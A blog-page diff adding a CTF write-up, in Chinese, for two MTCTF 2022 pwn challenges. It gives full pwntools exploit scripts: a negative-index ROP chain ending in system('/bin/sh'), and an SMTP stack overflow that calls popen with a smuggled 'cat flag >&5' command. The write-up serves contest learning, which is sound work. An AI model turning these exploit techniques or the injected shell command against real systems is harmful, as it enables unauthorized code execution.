@@ -20,15 +20,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="article">
-<meta property="og:title" content="MTCTF-2022">
+  <meta name="description" content="美团CTF2022初赛pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MTCTF2022初赛-pwn">
 <meta property="og:url" content="http://example.com/2022/09/22/MTCTF-2022/index.html">
 <meta property="og:site_name" content="Leof&#39;s blog">
+<meta property="og:description" content="美团CTF2022初赛pwn">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c.img.dasctf.com/images/2022930/1664523431127-f0d110d7-7d78-40a5-8a77-8f04368e9eb0.PNG">
+<meta property="og:image" content="https://c.img.dasctf.com/images/2022930/1664523785584-fc1b06bf-646d-49d7-87c5-ed5a04b9ba9c.png">
+<meta property="og:image" content="https://c.img.dasctf.com/images/2022930/1664524245930-5dcfbbf8-e2fb-441b-afe3-4c6c1f162666.png">
+<meta property="og:image" content="https://c.img.dasctf.com/images/2022930/1664525620380-e6a21110-1be9-42cf-8b48-a44c7e7c0bfe.png">
 <meta property="article:published_time" content="2022-09-22T08:00:13.000Z">
-<meta property="article:modified_time" content="2023-03-31T14:53:17.480Z">
+<meta property="article:modified_time" content="2023-03-31T15:03:06.710Z">
 <meta property="article:author" content="Leof">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="MTCTF2022">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c.img.dasctf.com/images/2022930/1664523431127-f0d110d7-7d78-40a5-8a77-8f04368e9eb0.PNG">
 
 <link rel="canonical" href="http://example.com/2022/09/22/MTCTF-2022/">
 
@@ -43,7 +53,7 @@
   };
 </script>
 
-  <title>MTCTF-2022 | Leof's blog</title>
+  <title>MTCTF2022初赛-pwn | Leof's blog</title>
   
 
 
@@ -199,7 +209,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          MTCTF-2022
+          MTCTF2022初赛-pwn
         </h1>
 
         <div class="post-meta">
@@ -216,8 +226,21 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-31 22:53:17" itemprop="dateModified" datetime="2023-03-31T22:53:17+08:00">2023-03-31</time>
+                <time title="修改时间：2023-03-31 23:03:06" itemprop="dateModified" datetime="2023-03-31T23:03:06+08:00">2023-03-31</time>
               </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+                </span>
+            </span>
 
           
 
@@ -230,7 +253,39 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p>美团CTF2022初赛pwn</p>
+<span id="more"></span>
+
+<h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>编辑堆块内容时idx可输入负数，而堆块的控制结构是保存在栈上的，往地址找二级指针即可覆盖返回地址写rop了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;39.106.27.2&#x27;</span></span><br><span class="line">port = <span class="number">45124</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5. leave&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4017b3</span></span><br><span class="line">start = <span class="number">0x401679</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(start)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;gdb.attach(io, &#x27;b* 0x40157F&#x27;)</span></span><br><span class="line"><span class="string">pause()&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">libcbase = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(pop_rdi) + p64(sh) + p64(sys_addr)</span><br><span class="line">edit(-<span class="number">6</span>, payload)</span><br><span class="line">ia()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;2cc46b7a-67ab-47a0-9575-7bd938da3ad6&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="stmp"><a href="#stmp" class="headerlink" title="stmp"></a>stmp</h1><p>一道stmp协议题</p>
+<p>漏洞在<code>sender_worker</code>函数中</p>
+<p><img src="https://c.img.dasctf.com/images/2022930/1664523431127-f0d110d7-7d78-40a5-8a77-8f04368e9eb0.PNG"></p>
+<p>a1的长度大于0xff即可进行一次strcpy，经过调试可以发现a1为输入的RCPT TO:所拼接的字符串，这里是我们可控的，所以只要进入这里就可以进行栈溢出了</p>
+<p>要进入这个函数也只需要在输入完data之后即可</p>
+<p>接下来构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10c</span> + <span class="number">4</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>此时会发现函数返回地址虽然被覆盖了，但是程序提前crash了，而不是执行到我们的返回地址</p>
+<p>跟进去调试</p>
+<p><img src="https://c.img.dasctf.com/images/2022930/1664523785584-fc1b06bf-646d-49d7-87c5-ed5a04b9ba9c.png" alt="image-20220930154304212"></p>
+<p>从这里可以知道ebp - 0xc的位置应该填充为一个可访问的地址</p>
+<p>更新payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p32(<span class="number">0x8049024</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + <span class="string">b&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/images/2022930/1664524245930-5dcfbbf8-e2fb-441b-afe3-4c6c1f162666.png" alt="image-20220930155044508"></p>
+<p>成功执行到返回地址</p>
+<p>接下来就是尝试拿shell或者想办法输出flag了，这里构造rop getshell是不可能的，因为泄露的libc地址只会在服务端输出</p>
+<p>我们利用popen函数 + 重定向来获得flag</p>
+<p>popen函数可以执行任意命令，只需要构造payload让程序执行<code>popen(&#39;cat flag &gt;&amp; 5&#39;, &#39;r&#39;)</code>即可获得flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;220 SMTP tsmtp&#x27;</span>, <span class="string">b&#x27;HELO&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mailfrom</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;MAIL FROM:&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RCPT</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;RCPT TO:&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DATA</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;250 Ok&#x27;</span>, <span class="string">b&#x27;DATA&#x27;</span> + con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">END</span>():</span><br><span class="line">    sl(<span class="string">b&#x27;.\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br><span class="line">mailfrom(<span class="string">b&#x27;cat flag &gt;&amp;5&#x27;</span>)</span><br><span class="line">a = elf.search(<span class="string">b&#x27;r\x00&#x27;</span>).__next__() <span class="comment">#b&#x27;r\x00&#x27;</span></span><br><span class="line">bss = <span class="number">0x804D140</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p32(<span class="number">0x8049024</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(elf.plt[<span class="string">&#x27;popen&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(bss) + p32(a)</span><br><span class="line">RCPT(payload)</span><br><span class="line">DATA(<span class="string">b&#x27;bbbbb&#x27;</span>)</span><br><span class="line">END()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/images/2022930/1664525620380-e6a21110-1be9-42cf-8b48-a44c7e7c0bfe.png" alt="image-20220930161338873"></p>
+<p>成功获得flag</p>
+
     </div>
 
     
@@ -238,6 +293,11 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/MTCTF2022/" rel="tag"># MTCTF2022</a>
+          </div>
 
         
 
@@ -310,6 +370,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#note"><span class="nav-number">1.</span> <span class="nav-text">note</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stmp"><span class="nav-number">2.</span> <span class="nav-text">stmp</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -325,7 +386,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -338,7 +399,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
